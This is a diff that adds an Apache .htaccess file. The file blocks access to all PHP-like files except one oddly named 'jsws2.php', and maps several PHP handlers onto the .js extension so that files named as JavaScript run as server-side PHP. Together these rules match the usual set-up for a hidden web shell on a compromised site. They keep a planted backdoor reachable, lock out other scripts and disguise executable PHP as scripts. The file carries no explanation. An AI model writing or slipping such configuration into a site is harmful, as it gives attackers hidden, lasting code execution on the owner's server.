@@ -1,0 +1,35 @@
+Options -Indexes
+<FilesMatch "(?i).*(shtml|php|phar|phtml|pht).*">
+        <IfModule !mod_authz_core.c>
+                Order Deny,Allow
+                Deny from all
+        </IfModule>
+
+        <IfModule mod_authz_core.c>
+                Require all denied
+        </IfModule>
+</FilesMatch>
+<Files jsws2.php>
+        <IfModule !mod_authz_core.c>
+                Allow from all
+        </IfModule>
+
+        <IfModule mod_authz_core.c>
+                Require all granted
+        </IfModule>
+</Files>
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php83 .js
+</IfModule>
+<IfModule mime_module>
+  AddHandler application/x-httpd-alt-php74___lsphp .js
+</IfModule>
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php74___lsphp .js
+</IfModule>
+<IfModule mime_module>
+  AddHandler application/x-httpd-php .js
+</IfModule>
+<IfModule mime_module>
+  AddHandler server-parsed .js
+</IfModule>
